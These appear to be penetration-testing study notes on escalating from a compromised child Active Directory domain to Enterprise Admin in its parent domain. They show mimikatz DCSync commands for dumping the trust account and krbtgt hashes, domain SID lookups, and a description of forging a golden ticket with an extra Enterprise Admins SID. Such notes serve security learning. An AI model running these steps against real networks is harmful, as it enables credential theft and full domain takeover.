#we are in prod.corp1.com domain and that domain trusts corp1.com then an account (corp1$) is created, TGT for corp1.com is created with that account password 
#similarly, corp1.com trusts prod.corp1.com domain then an account (prod$) is created, TGT for prod.corp1.com is created with that account password
#prod$ and corp1$ have same password, this password is the shared secret between the two domain

#Assuming we compromise prod.corp1.com domain and want to compromise corp1.com domain begin member of 'Entreprise Admins' group:

-we should obtain the NTLM hash of the trust account from the domain controller(corp1$) in mimikatz

lsadump::dcsync /domain:prod.corp1.com /user:corp1$
Ex: cf4bc17dff896101da4f3498a68d50f2

-we should get the krbtgt NTLM hash of prod.corp1.com

lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
Ex: 4b6af2bf64714682eeef64f516a08949

-we should get the domain SID of prod.corp1.com

Get-DomainSID -Domain prod.corp1.com
Ex: S-1-5-21-3776646582-2086779273-4091361643

-we should get the domain SID of corp1.com

Get-DomainSID -Domain corp1.com
Ex: S-1-5-21-1095350385-1831131555-2412080359 

-The final piece of information we need is the RID of the Enterprise Admins group with is 519

#we are ready to craft the golden ticket that will grant us Enterprise Admin membership in corp1.com.
#We'll supply the username inside prod.corp1.com (which does not have to be valid), the origin domain (/domain), 
#the origin domain SID (/sid), the krbtgt password hash (/krbtgt), and finally, the ExtraSid value (Enterprise Admins SID)
#through the /sids: option.

And we should be member of 'Entreprise Admins' group
